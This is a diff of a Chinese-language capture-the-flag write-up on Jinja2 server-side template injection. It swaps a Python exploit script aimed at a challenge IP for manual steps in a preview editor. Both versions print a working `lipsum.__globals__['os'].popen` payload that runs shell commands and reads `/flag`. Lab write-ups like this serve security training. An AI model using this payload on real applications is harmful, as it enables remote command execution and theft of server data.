@@ -13,40 +13,22 @@
 - 底部那句「预览在服务端完成」是关键：不是前端模板，而是后端真渲染，`{{7*7}}` 一类表达式必然生效。
 - 站点自己就提示了三个可用变量，先确认模板引擎：`{{7*7}}` 回显 49 → Jinja2。
 - Jinja2 的经典逃逸链：`lipsum.__globals__['os'].popen(cmd).read()`，`lipsum` 是 Flask 默认注入的全局函数，不需要额外对象。
-- 接口是 `POST /preview`，body 为 `{"src": "<模板>"}`，返回 JSON，渲染结果在 `html` 字段里。
+- 左右两个编辑区是实时联动的，payload 敲进左边，右边预览区立刻出结果，不用另外发请求。
 
 ## 关键步骤
 
-1. 打开 `/preview`，输入 `{{7*7}}`，右侧预览出 `49`，确认服务端模板注入。
-2. 构造 `{{lipsum.__globals__['os'].popen("id; ls -la /; cat /flag 2>/dev/null; ls -la /app 2>/dev/null").read()}}`。
-3. 一次性拿到 `id`、根目录列表和 `/flag` 内容。
-4. 从返回的 `html` 里正则取 flag。
+1. 打开页面，左边编辑区默认就是一段带 `{{name}}` 的模板。先把它清掉，只留一个 `{{7*7}}`，右边预览区立刻变成 `49`，确认是服务端渲染的 Jinja2。
+2. 把左边换成执行命令的 payload：
 
-```python
-import json, urllib.request, re
+   ```jinja2
+   {{lipsum.__globals__['os'].popen('id;cat /flag').read()}}
+   ```
 
-URL = 'http://103.85.23.250:30686/preview'
+3. 右边预览区直接吐回命令结果：`uid=33(www-data) gid=33(www-data) groups=33(www-data)`，后面紧跟 `/flag` 的内容：
 
-def render(src):
-    data = json.dumps({'src': src}).encode()
-    r = urllib.request.Request(URL, data=data, headers={'Content-Type': 'application/json'})
-    with urllib.request.urlopen(r, timeout=20) as resp:
-        return json.loads(resp.read().decode())
+   ![预览区渲出 flag](img/02-preview.png)
 
-cmd = 'id; ls -la /; cat /flag 2>/dev/null; ls -la /app 2>/dev/null'
-src = "{{lipsum.__globals__['os'].popen(\"%s\").read()}}" % cmd
-out = render(src)
-print(out['html'])
-print(re.search(r'S3C\{[^}]*\}', out['html']).group(0))
-```
-
-实测回显（`uid=33(www-data)`，根目录下 `flag` 为 18 字节，直接 `cat` 出内容）：
-
-![SSTI 命令执行回显](img/01-ssti.png)
-
-工具页面里同样的 payload 在右侧预览区直接渲染出命令结果：
-
-![预览区渲出 flag](img/02-preview.png)
+4. 把预览区里 `S3C{...}` 那段抄下来即可。
 
 ## Flag
 
@@ -56,5 +38,5 @@ S3C{b41b79d4415a}
 
 ## 踩坑 / 备注
 
-- 页面写着「.0.3 挂了 script，应该没事了」——只挡了前端 `<script>`，服务端模板注入完全没受影响。
-- 一次 payload 里塞多条命令（`id; ls; cat`）比逐条试快，也顺便确认了容器里的路径。
+- 页面右下角写着「.0.3 挂了 script，应该没事了」——那只是挡了前端 `<script>`，服务端模板注入完全没受影响。
+- 预览是实时请求 `/preview` 的，改完模板不用点按钮，等右侧刷新就行；如果没反应，多半是模板语法写错了，右侧会显示报错原文。
